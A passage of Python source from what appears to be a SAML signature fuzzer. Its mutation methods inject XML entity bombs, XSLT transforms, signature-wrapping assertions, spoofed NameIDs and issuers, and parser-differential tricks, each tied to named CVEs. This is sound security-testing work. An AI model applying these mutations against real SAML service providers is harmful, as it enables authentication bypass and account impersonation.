        bomb = (
            b"<!DOCTYPE bomb [\n"
            b'  <!ENTITY a "AAAAAAAAAA">\n'
            b'  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
            b'  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
            b"]>\n"
        )
        cleaned = re.sub(rb"<!DOCTYPE[^>]*>", b"", bytes(data))
        m_decl = _RE_XML_DECL.search(cleaned)
        pos = m_decl.end() if m_decl else 0
        return bytearray(cleaned[:pos] + b"\n" + bomb + cleaned[pos:])

    def _xslt_transform_inject(self, data: bytearray) -> bytearray | None:
        """XSLT transform injection (S5-3 / Google Project Zero 2022).

        Injects XSLT stylesheet into Transform chain. XSLT executes
        BEFORE signature verification in Java's javax.xml.crypto.
        """
        m = _RE_TRANSFORMS.search(data)
        if not m:
            return None
        xslt = self.rng.choice(XSLT_PAYLOADS)
        # Insert XSLT transform before the closing </ds:Transforms>
        return bytearray(
            bytes(data[: m.start(3)]) + xslt + b"\n" + bytes(data[m.start(3) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S6: Protocol-Level Attacks
    # ══════════════════════════════════════════════════════════════

    def _nameid_spoof(self, data: bytearray) -> bytearray | None:
        """NameID value manipulation (S6-2).

        Combined with any signature bypass, changes the identity.
        Also tests comment-in-NameID technique.
        """
        m = _RE_NAMEID.search(data)
        if not m:
            return None
        technique = self.rng.choice([
            # Direct replacement
            lambda: self.rng.choice(EVIL_NAMEIDS),
            # Comment boundary attack (CVE-2017-11427)
            lambda: b"admin@legit.com<!-->.evil.com",
            # Case manipulation
            lambda: b"ADMIN@EXAMPLE.COM",
            # Null byte injection
            lambda: b"admin\x00@example.com",
        ])
        evil = technique()
        return bytearray(
            bytes(data[: m.start(2)]) + evil + bytes(data[m.end(2) :])
        )

    def _audience_bypass(self, data: bytearray) -> bytearray | None:
        """Audience restriction bypass (S6-3)."""
        m = _RE_AUDIENCE.search(data)
        if not m:
            return None
        evil_audience = self.rng.choice([
            b"https://other-sp.example.com",
            b"*",
            b"",
            b"https://sp.example.com/../../admin",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + evil_audience + bytes(data[m.end(2) :])
        )

    def _timestamp_manipulation(self, data: bytearray) -> bytearray | None:
        """Timestamp / expiry manipulation (S6-1)."""
        m = _RE_NOTONORAFTER.search(data)
        if not m:
            return None
        evil_ts = self.rng.choice([
            b"2099-12-31T23:59:59Z",
            b"1970-01-01T00:00:00Z",
            b"",
            b"not-a-timestamp",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + evil_ts + bytes(data[m.end(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S7: Cryptographic Infrastructure
    # ══════════════════════════════════════════════════════════════

    def _golden_saml_self_signed(self, data: bytearray) -> bytearray | None:
        """Self-signed certificate injection (S4-2 / S7-1 pattern).

        Replace KeyInfo with attacker-controlled certificate data.
        Tests whether SP trusts embedded KeyInfo vs. pre-configured cert.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        fake_keyinfo = (
            b"<ds:KeyInfo><ds:X509Data>"
            b"<ds:X509Certificate>FAKE_SELF_SIGNED_CERT_BASE64</ds:X509Certificate>"
            b"</ds:X509Data></ds:KeyInfo>"
        )
        return bytearray(
            bytes(data[: m.start()])
            + fake_keyinfo
            + bytes(data[m.end() :])
        )

    # ══════════════════════════════════════════════════════════════
    # S8: Implementation-Specific Flaws
    # ══════════════════════════════════════════════════════════════

    def _xmlcrypto_firstchild(self, data: bytearray) -> bytearray | None:
        """xml-crypto firstChild navigation bug (S8-2 / SAMLStorm).

        Prepend a comment or PI before the Response element so that
        firstChild points to the wrong node.
        """
        prefix = self.rng.choice([
            b"<!-- evil -->",
            b"<?evil target?>",
            b"<!-- -->\n<!-- -->",
        ])
        m = _RE_RESPONSE_OPEN.search(data)
        if not m:
            return bytearray(prefix + bytes(data))
        return bytearray(
            bytes(data[: m.start()]) + prefix + b"\n" + bytes(data[m.start() :])
        )

    def _samlify_xpath_scope(self, data: bytearray) -> bytearray | None:
        """samlify XPath scope failure (S8-2 / CVE-2025-47949).

        Insert a valid signature from metadata/error response outside
        the assertion scope. samlify validates the signature but doesn't
        check it covers the processed assertion.
        """
        # Strategy: add a second ds:Signature at Response level
        fake_sig = (
            b'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
            b"<ds:SignedInfo>"
            b'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
            b'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
            b'<ds:Reference URI="">'
            b"<ds:DigestMethod "
            b'Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
            b"<ds:DigestValue>AAAA</ds:DigestValue>"
            b"</ds:Reference></ds:SignedInfo>"
            b"<ds:SignatureValue>BBBB</ds:SignatureValue>"
            b"</ds:Signature>"
        )
        m = _RE_RESPONSE_OPEN.search(data)
        if not m:
            return None
        return bytearray(
            bytes(data[: m.end()]) + b"\n" + fake_sig + bytes(data[m.end() :])
        )

    def _rexml_namespace_quirk(self, data: bytearray) -> bytearray | None:
        """REXML xml: prefix namespace quirk (S8-2 / CVE-2025-25292).

        REXML treats xml: prefix as a regular attribute. Adding
        xml:xmlns='...' makes REXML see a different namespace structure
        than Nokogiri/libxml2.
        """
        m = _RE_SIGNATURE_OPEN.search(data)
        if not m:
            return None
        injection = self.rng.choice([
            b' xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
            b' xml:lang="en" xml:xmlns="http://evil.com"',
        ])
        pos = m.end() - 1
        return bytearray(
            bytes(data[:pos]) + injection + bytes(data[pos:])
        )

    def _libxml2_id_caching(self, data: bytearray) -> bytearray | None:
        """libxml2 internal ID caching abuse (S8-1 / CVE-2025-23369).

        Create duplicate ID attributes to confuse libxml2's internal
        caching mechanism for getElementById() lookups.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        tag = bytes(data[m.start() : m.end()])
        # Extract existing ID
        id_match = re.search(rb'ID="([^"]*)"', tag)
        if not id_match:
            return None
        original_id = id_match.group(1)
        # Create a hidden element with the same ID earlier in the document
        decoy = (
            b'<decoy ID="' + original_id + b'" '
            b'xmlns="urn:oasis:names:tc:SAML:2.0:assertion"/>\n'
        )
        r_open = _RE_RESPONSE_OPEN.search(data)
        if not r_open:
            return None
        return bytearray(
            bytes(data[: r_open.end()])
            + b"\n"
            + decoy
            + bytes(data[r_open.end() :])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S2: Encoding & Parser Differential Attacks
    # ══════════════════════════════════════════════════════════════

    def _encoding_bom_injection(self, data: bytearray) -> bytearray | None:
        """BOM injection (S2-NEW). Go rejects UTF-16, libxml2 auto-detects."""
        bom = self.rng.choice(ENCODING_BOMS)
        # Remove existing BOM if present
        cleaned = bytes(data)
        for b in ENCODING_BOMS:
            if cleaned.startswith(b):
                cleaned = cleaned[len(b):]
                break
        return bytearray(bom + cleaned)

    def _encoding_declaration_swap(self, data: bytearray) -> bytearray | None:
        """Replace XML encoding declaration (S2-NEW).

        Mismatched encoding causes different parser behavior: libxml2
        re-encodes, Go encoding/xml rejects non-UTF-8, xmldom ignores.
        """
        decl = self.rng.choice(ENCODING_DECLARATIONS)
        cleaned = bytes(data)
        m = _RE_XML_DECL.search(cleaned)
        if m:
            cleaned = cleaned[:m.start()] + cleaned[m.end():]
        return bytearray(decl + b"\n" + cleaned)

    def _namespace_undeclare(self, data: bytearray) -> bytearray | None:
        """Namespace prefix undeclaration (S2-NEW).

        xmlns:saml="" is invalid in XML 1.0 Namespaces but some parsers
        accept it. Go encoding/xml silently accepts; libxml2 rejects.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        undecl = self.rng.choice(NAMESPACE_UNDECLARATIONS)
        pos = m.end() - 1
        return bytearray(
            bytes(data[:pos]) + b" " + undecl + bytes(data[pos:])
        )

    def _processing_instruction_inject(self, data: bytearray) -> bytearray | None:
        """PI injection inside Signature/Assertion (S2-NEW).

        python3-saml's remove_pis=True parser strips PIs before
        signature verification — proven to cause sig=TRUE.
        """
        pi = self.rng.choice(PI_PAYLOADS)
        target = self.rng.choice([
            _RE_SIGNATURE_OPEN,
            _RE_ASSERTION_OPEN,
        ])
        m = target.search(data)
        if not m:
            return None
        # Insert PI right after the opening tag
        return bytearray(
            bytes(data[:m.end()]) + pi + bytes(data[m.end():])
        )

    def _whitespace_crlf_inject(self, data: bytearray) -> bytearray | None:
        """Whitespace/CRLF/null injection into Base64 values (S2-NEW).

        Base64 decoders handle embedded whitespace differently:
        Go strict, libxml2 lenient, PHP very lenient.
        """
        # Pick a Base64 value element
        target_re = self.rng.choice([
            _RE_SIGNATURE_VALUE,
            _RE_DIGEST_VALUE,
            _RE_X509_CERT,
        ])
        m = target_re.search(data)
        if not m:
            return None
        value = bytes(data[m.start(2):m.end(2)])
        if len(value) < 4:
            return None
        # Insert whitespace at a random position within the value
        ws = self.rng.choice(WHITESPACE_INJECTIONS)
        pos = self.rng.randint(1, len(value) - 1)
        new_value = value[:pos] + ws + value[pos:]
        return bytearray(
            bytes(data[:m.start(2)]) + new_value + bytes(data[m.end(2):])
        )

    def _comment_in_element_name(self, data: bytearray) -> bytearray | None:
        """Comment between namespace prefix and local name (S2-NEW).

        <saml:<!---->Assertion> — most parsers reject but some tokenizers
        handle differently.
        """
        targets = [
            (b"<saml:Assertion", b"<saml:<!---->Assertion"),
            (b"<ds:Signature", b"<ds:<!---->Signature"),
            (b"<saml:NameID", b"<saml:<!---->NameID"),
        ]
        original, replacement = self.rng.choice(targets)
        if original not in bytes(data):
            return None
        result = bytes(data).replace(original, replacement, 1)
        return bytearray(result)

    def _namespace_prefix_remap(self, data: bytearray) -> bytearray | None:
        """Remap saml: prefix to saml2: (S2-NEW).

        Same namespace URI but different prefix. Libraries using
        prefix-based XPath break; local-name-only works fine.
        """
        raw = bytes(data)
        if b"saml:" not in raw:
            return None
        # Step 1: Rename xmlns:saml= declaration to xmlns:saml2=
        result = raw.replace(b'xmlns:saml="', b'xmlns:saml2="')
        # Step 2: Replace saml: prefix in element tags to saml2:
        result = result.replace(b"<saml:", b"<saml2:")
        result = result.replace(b"</saml:", b"</saml2:")
        # Step 3: Fix any saml2p: back to samlp: (in case xmlns:samlp was affected)
        result = result.replace(b"xmlns:saml2p=", b"xmlns:samlp=")
        # Fallback: if no xmlns:saml2= exists, add it on the first saml2: element
        if b'xmlns:saml2=' not in result:
            m = re.search(rb"<saml2:\w+\b[^>]*>", result, re.IGNORECASE | re.DOTALL)
            if m:
                pos = m.end() - 1
                ns_decl = b' xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"'
                result = result[:pos] + ns_decl + result[pos:]
        return bytearray(result)

    # ══════════════════════════════════════════════════════════════
    # NEW S3: Transform & Canonicalization Attacks
    # ══════════════════════════════════════════════════════════════

    def _transform_chain_inject(self, data: bytearray) -> bytearray | None:
        """Inject extra transform into ds:Transforms (S3-NEW).

        XPath filter, inclusive c14n, or base64 transforms create
        different canonicalized output across libraries.
        """
        m = _RE_TRANSFORMS.search(data)
        if not m:
            return None
        extra = self.rng.choice(EXTRA_TRANSFORMS)
        # Insert before </ds:Transforms>
        return bytearray(
            bytes(data[:m.start(3)]) + extra + b"\n" + bytes(data[m.start(3):])
        )

    def _transform_remove_enveloped(self, data: bytearray) -> bytearray | None:
        """Remove enveloped-signature transform (S3-NEW).

        Some libraries still validate without it; others fail. The
        digest computation changes without this transform.
        """
        m = _RE_ENVELOPED_TRANSFORM.search(data)
        if not m:
            return None
        return bytearray(
            bytes(data[:m.start()]) + bytes(data[m.end():])
        )

    def _reference_uri_empty(self, data: bytearray) -> bytearray | None:
        """Set Reference URI to empty or fragment-only (S3-NEW / SAMLStorm).

        Empty URI means "whole document". Different libraries scope
        the signed content differently when URI is empty.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        payload = self.rng.choice([b"", b"#"])
        return bytearray(
            bytes(data[:m.start(2)]) + payload + bytes(data[m.end(2):])
        )

    def _reference_uri_xpointer(self, data: bytearray) -> bytearray | None:
        """Set Reference URI to XPointer syntax (S3-NEW).

        Go encoding/xml has no XPointer support. libxml2 may evaluate
        differently than xmldom.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        payload = self.rng.choice([
            b"xpointer(/)",
            b"xpointer(id('_evil'))",
            b"#_wrong_id",
        ])
        return bytearray(
            bytes(data[:m.start(2)]) + payload + bytes(data[m.end(2):])
        )

    def _c14n_method_swap(self, data: bytearray) -> bytearray | None:
        """Swap CanonicalizationMethod between inclusive/exclusive (S3-NEW).

        Inclusive c14n inherits ancestor namespace context; exclusive
        doesn't. This changes digest computation.
        """
        m = _RE_C14N_METHOD.search(data)
        if not m:
            return None
        algo = self.rng.choice(C14N_ALGORITHMS)
        return bytearray(
            bytes(data[:m.start(2)]) + algo + bytes(data[m.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S4: Signature Infrastructure Attacks
    # ══════════════════════════════════════════════════════════════

    def _duplicate_reference(self, data: bytearray) -> bytearray | None:
        """Duplicate Reference element with different URI (S4-NEW).

        Tests whether libraries validate all references or only first/last.
        """
        m = _RE_REFERENCE_BLOCK.search(data)
        if not m:
            return None
        ref_block = bytes(data[m.start():m.end()])
        # Create a clone with empty URI
        clone = re.sub(rb'URI="[^"]*"', b'URI=""', ref_block)
        # Insert clone after the original
        return bytearray(
            bytes(data[:m.end()]) + b"\n" + clone + bytes(data[m.end():])
        )

    def _keyinfo_confusion(self, data: bytearray) -> bytearray | None:
        """Replace X509Data with KeyValue or empty KeyInfo (S4-NEW).

        Tests whether libraries fall back to embedded key data or
        require pre-configured certificate.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        replacement = self.rng.choice([
            b"<ds:KeyInfo><ds:KeyValue><ds:RSAKeyValue>"
            b"<ds:Modulus>AAAA</ds:Modulus>"
            b"<ds:Exponent>AQAB</ds:Exponent>"
            b"</ds:RSAKeyValue></ds:KeyValue></ds:KeyInfo>",
            b"<ds:KeyInfo/>",
            b"",  # remove KeyInfo entirely
        ])
        return bytearray(
            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
        )

    def _signedinfo_manipulation(self, data: bytearray) -> bytearray | None:
        """Manipulate SignedInfo internal structure (S4-NEW).

        Duplicate CanonicalizationMethod, add extra elements, or
        change namespace declaration within SignedInfo.
        """
        m = _RE_SIGNED_INFO.search(data)
        if not m:
            return None
        content = bytes(data[m.start(2):m.end(2)])
        technique = self.rng.choice(["dup_c14n", "extra_elem", "ns_inject"])
        if technique == "dup_c14n":
            cm = _RE_C14N_METHOD.search(content)
            if not cm:
                return None
            # Regex ends at closing " — find the /> or > that closes the element
            rest = content[cm.end():]
            close = rest.find(b"/>")
            if close < 0:
                close = rest.find(b">")
                if close < 0:
                    return None
                elem_end = cm.end() + close + 1
            else:
                elem_end = cm.end() + close + 2
            dup = content[cm.start():elem_end]
            new_content = content[:elem_end] + b"\n" + dup + content[elem_end:]
        elif technique == "extra_elem":
            new_content = content + b'<ds:Evil xmlns:ds="http://www.w3.org/2000/09/xmldsig#"/>'
        else:
            new_content = content.replace(
                b"<ds:SignedInfo>",
                b'<ds:SignedInfo xmlns:evil="http://evil.com">',
                1,
            )
            if new_content == content:
                # SignedInfo was already matched at group boundary
                new_content = content + b'<!-- ns inject -->'
        return bytearray(
            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S6: Protocol-Level Attacks
    # ══════════════════════════════════════════════════════════════

    def _issuer_spoof(self, data: bytearray) -> bytearray | None:
        """Issuer value manipulation (S6-NEW).

        Tests whether SPs cross-validate Issuer against IdP metadata.
        """
        m = _RE_ISSUER.search(data)
        if not m:
            return None
        evil = self.rng.choice(EVIL_ISSUERS)
        return bytearray(
            bytes(data[:m.start(2)]) + evil + bytes(data[m.end(2):])
        )

    def _subject_confirmation_bypass(self, data: bytearray) -> bytearray | None:
        """SubjectConfirmation Method/Recipient manipulation (S6-NEW).

        Tests bearer vs holder-of-key confusion and Recipient validation.
        """
        result = bytearray(data)
        m = _RE_SUBJECT_CONFIRMATION.search(result)
        if m:
            method = self.rng.choice(SUBJECT_CONFIRMATION_METHODS)
            result[m.start(2):m.end(2)] = method
        # Also try Recipient manipulation
        mr = _RE_RECIPIENT.search(result)
        if mr and self.rng.random() < 0.6:
            evil_recipient = self.rng.choice([
                b"https://evil-sp.com/acs",
                b"*",
                b"",
            ])
            result[mr.start(2):mr.end(2)] = evil_recipient
        if not m and not mr:
            return None
        return result

    def _condition_manipulation(self, data: bytearray) -> bytearray | None:
        """Condition/timing manipulation (S6-NEW).

        Set NotBefore to future, duplicate AudienceRestriction, or
        remove Conditions entirely.
        """
        technique = self.rng.choice(["notbefore", "audience_dup", "remove"])
        if technique == "notbefore":
            m = _RE_NOTBEFORE.search(data)
            if not m:
                return None
            evil_ts = self.rng.choice([
                b"2099-12-31T23:59:59Z",
                b"1970-01-01T00:00:00Z",
                b"",
            ])
            return bytearray(
                bytes(data[:m.start(2)]) + evil_ts + bytes(data[m.end(2):])
            )
        elif technique == "audience_dup":
            m = _RE_AUDIENCE.search(data)
            if not m:
                return None
            dup = (
                b'<saml:AudienceRestriction>'
                b'<saml:Audience>https://evil-sp.com</saml:Audience>'
                b'</saml:AudienceRestriction>'
            )
            return bytearray(
                bytes(data[:m.end()]) + dup + bytes(data[m.end():])
            )
        else:
            # Remove Conditions block entirely
            raw = bytes(data)
            start = raw.find(b"<saml:Conditions")
            if start == -1:
                return None
            end = raw.find(b"</saml:Conditions>", start)
            if end == -1:
                return None
            end += len(b"</saml:Conditions>")
            return bytearray(raw[:start] + raw[end:])

    def _attribute_injection(self, data: bytearray) -> bytearray | None:
        """Inject extra attributes into AttributeStatement (S6-NEW).

        Tests whether libraries merge or overwrite attributes with
        duplicate names.
        """
        m = _RE_ATTRIBUTE_STATEMENT_CLOSE.search(data)
        if not m:
            return None
        attr = self.rng.choice(EVIL_ATTRIBUTES)
        return bytearray(
            bytes(data[:m.start()]) + attr + b"\n" + bytes(data[m.start():])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S8: Implementation-Specific
    # ══════════════════════════════════════════════════════════════

    def _assertion_count_bomb(self, data: bytearray) -> bytearray | None:
        """Multiple assertion injection with different NameIDs (S8-NEW).

        3-5 cloned assertions test extraction order across libraries
        more aggressively than single-clone XSW strategies.
        """
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        count = self.rng.randint(3, 5)
        clones = b""
        for _ in range(count):
            clones += _make_evil_assertion(self.rng) + b"\n"
        return bytearray(
            bytes(data[:span[0]]) + clones + bytes(data[span[0]:])
        )

    def _go_encoding_xml_quirk(self, data: bytearray) -> bytearray | None:
        """Go encoding/xml specific quirks (S8-NEW).

        Target known Go parser behaviors: duplicate attributes (keeps last),
        default namespace injection. These create differentials with libxml2.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        payload, _ = self.rng.choice(GO_QUIRK_PAYLOADS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + payload + bytes(data[pos:])
        )

    # ══════════════════════════════════════════════════════════════
    # G: CVE Gap Strategies (2025-2026 recently discovered vectors)
    # ══════════════════════════════════════════════════════════════

    def _xsw_first_assertion_extract(self, data: bytearray) -> bytearray | None:
        """CVE-2026-25922: First-assertion extraction attack.

        Insert a full-structure evil assertion BEFORE the signed one.
        Unlike basic XSW1 (minimal evil assertion), this creates a
        complete assertion with Issuer, Conditions, AuthnStatement
        so it passes "looks like a valid assertion" heuristics.
        Libraries that validate the signed assertion but then extract
        the first assertion from the document are vulnerable.
        """
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        evil_id = self.rng.randbytes(8).hex().encode()
        nameid = self.rng.choice(EVIL_NAMEIDS)
        evil = (
            XSW_FULL_EVIL_ASSERTION_TEMPLATE
            .replace(b"{EVIL_ID}", evil_id)
            .replace(b"{EVIL_NAMEID}", nameid)
        )
        return bytearray(
            bytes(data[: span[0]]) + evil + b"\n" + bytes(data[span[0] :])
        )

    def _xsw_signed_in_extensions(self, data: bytearray) -> bytearray | None:
        """CVE-2025-54369: Post-validation document extraction.

        Move the signed assertion into <samlp:Extensions> or <samlp:StatusDetail>,
        then insert an unsigned evil assertion in the original position.
        Libraries that validate the signature (finding it in Extensions) but
        extract assertions from the Response root are vulnerable.
        """
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        signed_block = bytes(data[span[0] : span[1]])
        evil = _make_evil_assertion(self.rng)

        # Choose container: Extensions or StatusDetail
        if self.rng.random() < 0.5:
            wrapper = XSW_EXTENSIONS_PREFIX + signed_block + XSW_EXTENSIONS_SUFFIX
        else:
            wrapper = XSW_STATUSDETAIL_PREFIX + signed_block + XSW_STATUSDETAIL_SUFFIX

        # Find insertion point: after </samlp:Status>
        status_close = data.find(b"</samlp:Status>")
        if status_close < 0:
            return None
        insert_pos = status_close + len(b"</samlp:Status>")

        # Replace signed assertion with evil, insert wrapper after Status
        result = (
            bytes(data[: span[0]])
            + evil
            + bytes(data[span[1] : insert_pos])
            + b"\n"
            + wrapper
            + bytes(data[insert_pos:])
        )
        # Fix: if span was before insert_pos we need to adjust for removed bytes
        # Simpler approach: reconstruct from before assertion
        before = bytes(data[: span[0]])
        after_assertion = bytes(data[span[1] :])
        status_close2 = after_assertion.find(b"</samlp:Status>")
        if status_close2 < 0:
            # Status was before assertion
            return bytearray(
                before + evil + after_assertion
            )
        insert2 = status_close2 + len(b"</samlp:Status>")
        return bytearray(
            before
            + evil
            + after_assertion[:insert2]
            + b"\n"
            + wrapper
            + after_assertion[insert2:]
        )

    def _reserved_ns_attr_inject(self, data: bytearray) -> bytearray | None:
        """CVE-2025-66567: Reserved namespace attribute injection.

        Add xml:xmlns='...' or xmlns:xml='...' to Signature or Assertion.
        REXML treats these as regular attributes; Nokogiri/libxml2 treats
        them as reserved (ignores or errors). This makes the Signature
        visible to one parser but invisible to another.
        """
        # Choose target: Signature or Assertion
        if self.rng.random() < 0.5:
            target_re = _RE_SIGNATURE_OPEN
        else:
            target_re = _RE_ASSERTION_OPEN
        m = target_re.search(data)
        if not m:
            return None
        attr = self.rng.choice(RESERVED_NS_ATTRS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + attr + bytes(data[pos:])
        )

    def _void_c14n_precomputed_digest(self, data: bytearray) -> bytearray | None:
        """CVE-2025-66568: Void canonicalization with precomputed digest.

        Inject a relative namespace URI (e.g., xmlns:ns="1") to trigger
        canonicalization failure (empty string output), then replace
        DigestValue with SHA-256("") so the digest validates against
        the empty canonical form.
        """
        # Step 1: Inject relative NS on Assertion
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        ns_attr = b' xmlns:voidns="1"'
        pos = m.end() - 1
        result = bytes(data[:pos]) + ns_attr + bytes(data[pos:])

        # Step 2: Replace DigestValue with precomputed empty digest
        m_dv = _RE_DIGEST_VALUE.search(result)
        if not m_dv:
            return bytearray(result)  # at least inject the NS
        return bytearray(
            result[: m_dv.start(1)]
            + EMPTY_SHA256_B64
            + result[m_dv.end(1) :]
        )

    def _ns_prefixed_attr_dup(self, data: bytearray) -> bytearray | None:
        """PortSwigger Fragile Lock: Namespace-prefixed attribute duplication.

        Add a namespace-prefixed duplicate of the ID attribute on Assertion
        (e.g., saml:ID="_evil"). Different parsers resolve the ID differently:
        - libxml2: declaration order based
        - REXML: namespace-aware vs unaware lookup differs
        This creates a Reference URI mismatch across parser implementations.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        attr = self.rng.choice(NS_PREFIXED_ID_ATTRS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + attr + bytes(data[pos:])
        )

    # ══════════════════════════════════════════════════════════════
    # H: Newly Discovered Gap Strategies
    # ══════════════════════════════════════════════════════════════

    def _unicode_normalization(self, data: bytearray) -> bytearray | None:
        """Unicode normalization confusion (H1).

        Replace ASCII characters in NameID/Issuer with visually similar
        Unicode equivalents (Cyrillic homoglyphs, fullwidth forms, NFD
        decomposed characters, zero-width insertions).

        XML C14N does NOT perform Unicode normalization, so:
        - If parser A normalizes (NFKC) before comparison: sees "admin"
        - If parser B compares raw bytes: sees different string
        - Digest computation uses raw bytes → signed content preserved
        - But identity comparison may differ across implementations
        """
        m = _RE_NAMEID.search(data)
        if not m:
            m = _RE_ISSUER.search(data)
        if not m:
            return None

        original, replacement, _desc = self.rng.choice(UNICODE_NORMALIZATION_PAIRS)
        text = bytes(data[m.start(2):m.end(2)])

        if original not in text:
            # Try inserting zero-width char at random position
            if len(text) > 2:
                zwsp = b"\xe2\x80\x8b"  # U+200B ZERO WIDTH SPACE
                pos = self.rng.randint(1, len(text) - 1)
                new_text = text[:pos] + zwsp + text[pos:]
                return bytearray(
                    bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
                )
            return None

        # Replace first occurrence only
        new_text = text.replace(original, replacement, 1)
        return bytearray(
            bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
        )

    def _null_byte_inject(self, data: bytearray) -> bytearray | None:
        """Null byte injection in NameID/Issuer/Audience (H2).

        C-based parsers (libxml2) may truncate strings at null bytes.
        Java (Xerces), Python (lxml with unicode), Go treat null as
        regular character or reject entirely.

        Attack: sign "admin@evil.com\\x00user@example.com", some parsers
        see "admin@evil.com" while others see the full string.
        """
        # Choose target: NameID (70%), Issuer (20%), Audience (10%)
        roll = self.rng.random()
        if roll < 0.7:
            m = _RE_NAMEID.search(data)
        elif roll < 0.9:
            m = _RE_ISSUER.search(data)
        else:
            m = _RE_AUDIENCE.search(data)
        if not m:
            return None

        text = bytes(data[m.start(2):m.end(2)])
        payload = self.rng.choice(NULL_BYTE_PAYLOADS)

        # Injection mode
        mode = self.rng.choice(["prefix", "suffix", "middle", "replace"])
        if mode == "prefix":
            new_text = payload + text
        elif mode == "suffix":
            new_text = text + payload
        elif mode == "middle" and len(text) > 2:
            pos = self.rng.randint(1, len(text) - 1)
            new_text = text[:pos] + payload + text[pos:]
        else:
            # Replace with evil + null + original
            evil = self.rng.choice(EVIL_NAMEIDS)
            new_text = evil + b"\x00" + text

        return bytearray(
            bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
        )

    def _multi_sig_scope(self, data: bytearray) -> bytearray | None:
        """Multi-signature scope confusion (H3).

        Add a second ds:Signature at Response level when only an
        assertion-level signature exists (or vice versa). Tests which
        signature takes precedence:
        - Some libraries validate FIRST signature found
        - Others validate the signature closest to the signed element
        - Some validate ALL signatures (strictest)
        - Some validate Response-level only, ignoring assertion-level

        A fake Response-level signature that fails validation may cause
        some libraries to reject entirely, while others fall through to
        the valid assertion-level signature.
        """
        # Must have existing signature
        if b"<ds:Signature" not in data and b"<Signature" not in data:
            return None

        mode = self.rng.choice([
            "response_sig_before",     # fake sig before assertion
            "response_sig_after",      # fake sig after assertion
            "duplicate_assertion_sig", # clone assertion sig
        ])

        if mode in ("response_sig_before", "response_sig_after"):
            # Insert fake Response-level signature
            sig = FAKE_RESPONSE_SIGNATURE
            resp_open = _RE_RESPONSE_OPEN.search(data)
            if not resp_open:
                return None

            if mode == "response_sig_before":
                # Insert right after <samlp:Response ...>
                pos = resp_open.end()
                return bytearray(
                    bytes(data[:pos]) + b"\n" + sig + bytes(data[pos:])
                )
            else:
                # Insert before </samlp:Response>
                resp_close = _RE_RESPONSE_CLOSE.search(data)
                if not resp_close:
                    return None
                pos = resp_close.start()
                return bytearray(
                    bytes(data[:pos]) + sig + b"\n" + bytes(data[pos:])
                )

        else:
            # Duplicate existing assertion-level signature
            sig_span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
            if not sig_span:
                return None
            sig_block = bytes(data[sig_span[0]:sig_span[1]])
            # Insert duplicate right after the original
            return bytearray(
                bytes(data[:sig_span[1]]) + b"\n" + sig_block + bytes(data[sig_span[1]:])
            )

    # ══════════════════════════════════════════════════════════════
    # I: Extraction Divergence Strategies
    # ══════════════════════════════════════════════════════════════

    def _nameid_mixed_content(self, data: bytearray) -> bytearray | None:
        """NameID mixed content injection (I1).

        Inserts child elements or PIs inside NameID to exploit text
        extraction method differences:
        - ruby-saml REXML .text → first text node only
        - lxml itertext() → all descendant text concatenated
        - DOM textContent → all descendant text concatenated

        Example: <NameID>evil<x>legit</x></NameID>
          .text    → "evil"
          itertext → "evillegit"
        """
        m = _RE_NAMEID.search(data)
        if not m:
            return None

        original_text = m.group(2)
        if not original_text or len(original_text) < 3:
            return None

        tail_suffixes = [
            b"admin",
            b"system",
            b"root",
            b"example.com",
        ]
        tail = self.rng.choice(tail_suffixes)

        if b"@" in original_text:
            local, domain = original_text.split(b"@", 1)
            prefix = local + b"@"
            qualifier = domain
        else:
            split_at = max(1, len(original_text) // 2)
            prefix = original_text[:split_at]
            qualifier = original_text[split_at:] or b"example.com"

        mode = self.rng.choice([
            "foreign_child_tail",
            "empty_child_tail",
            "saml_child_tail",
            "processing_instruction_tail",
        ])

        if mode == "foreign_child_tail":
            # prefix<x xmlns=""/>tail → .text sees prefix, textContent sees prefix+tail
            new_content = prefix + b'<x xmlns=""></x>' + tail
        elif mode == "empty_child_tail":
            # original<span/>tail → empty child with only tail text
            new_content = original_text + b"<span/>" + tail
        elif mode == "saml_child_tail":
